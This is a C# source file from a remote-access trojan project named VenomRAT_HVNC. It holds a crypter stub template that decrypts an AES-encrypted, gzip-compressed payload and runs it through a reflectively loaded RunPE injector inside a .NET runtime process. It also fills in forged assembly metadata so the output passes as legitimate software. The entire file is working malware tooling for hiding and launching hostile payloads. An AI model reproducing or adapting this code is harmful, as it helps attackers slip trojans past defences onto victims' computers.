namespace VenomRAT_HVNC.Crypter.Other;

public class Settings
{
    public static string Stub =
        "using System;\nusing System.IO;\nusing System.IO.Compression;\nusing System.Linq;\nusing System.Reflection;\nusing System.Runtime.InteropServices;\nusing System.Security.Cryptography;\nusing System.Text;\n\n\n[assembly: AssemblyTitle(\"#AssemblyTitle#\")]\n[assembly: AssemblyDescription(\"#AssemblyDescriptions#\")]\n[assembly: AssemblyConfiguration(\"#AssemblyConfigurations#\")]\n[assembly: AssemblyCompany(\"#AssemblyCompany#\")]\n[assembly: AssemblyProduct(\"#AssemblyProduct#\")]\n[assembly: AssemblyCopyright(\"#AssemblyCopyright#\")]\n[assembly: AssemblyTrademark(\"#AssemblyTrademark#\")]\n[assembly: AssemblyVersion(\"999.998.997.996\")]\n[assembly: AssemblyFileVersion(\"999.998.997.996\")]\n\nnamespace Stub\n{\n    static class Program\n    {\n        [STAThread]\n        static void Main()\n        {\n            string passwordAesCompressStub = \"#PASSWORD_AES_COMPRESS_STUB#\";\n            string payloadAesCompressStub = \"#PAYLOAD_AES_COMPRESS_STUB#\";\n\n            RunPe(Decompress(Decrypt(payloadAesCompressStub, passwordAesCompressStub)));\n        }\n\n        private static void RunPe(byte[] data)\n        {\n            string codeRunPe = \"#CodeRunPE#\";\n            string passwordRunPe = \"#PasswordRunPE#\";\n            string pathProcess = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), \"#PathProcess#\");\n\n            Assembly runpeLoader =\n                Assembly.Load(Decompress(Decrypt(codeRunPe, passwordRunPe)));\n\n            MethodInfo mi = runpeLoader.GetType(\"#NamespaceRunpe#.#ClassRunpe#\").GetMethod(\"#MethodsRunPE#\");\n            object[] parameters = { pathProcess, data };\n            mi.Invoke(null, parameters);\n        }\n\n        public static byte[] Decrypt(string encryptedText, string key)\n        {\n            byte[] encryptedBytes = Convert.FromBase64String(encryptedText);\n            using (AesManaged aes256 = new AesManaged())\n            {\n                using (SHA256CryptoServiceProvider sha256Hash = new SHA256CryptoServiceProvider())\n                {\n                    byte[] hash = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(key));\n                    aes256.KeySize = 256;\n                    aes256.BlockSize = 128;\n                    aes256.Key = hash.Take(aes256.KeySize / 8).ToArray();\n                    aes256.IV = hash.Take(aes256.BlockSize / 8).ToArray();\n                    aes256.Mode = CipherMode.CBC;\n                    byte[] decryptedBytes;\n\n                    using (MemoryStream memoryStream = new MemoryStream(encryptedBytes))\n                    {\n                        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes256.CreateDecryptor(),\n                                   CryptoStreamMode.Read))\n                        {\n                            using (MemoryStream tempStream = new MemoryStream())\n                            {\n                                byte[] buffer = new byte[1024];\n                                int read;\n                                while ((read = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)\n                                {\n                                    tempStream.Write(buffer, 0, read);\n                                }\n\n                                decryptedBytes = tempStream.ToArray();\n                            }\n                        }\n                    }\n\n                    return decryptedBytes;\n                }\n            }\n        }\n\n        public static byte[] Decompress(byte[] compressedData)\n        {\n            using (MemoryStream compressedStream = new MemoryStream(compressedData))\n            {\n                using (MemoryStream decompressedStream = new MemoryStream())\n                {\n                    using (GZipStream gzipStream = new GZipStream(compressedStream, CompressionMode.Decompress))\n                    {\n                        gzipStream.CopyTo(decompressedStream);\n                    }\n\n                    return decompressedStream.ToArray();\n                }\n            }\n        }\n    }\n}";

    public static string FileNameRunPeDllMain { get; } = "RunPE.dll";
    public static string FileNameRunPeDllTemps { get; } = "Temps.dll";
}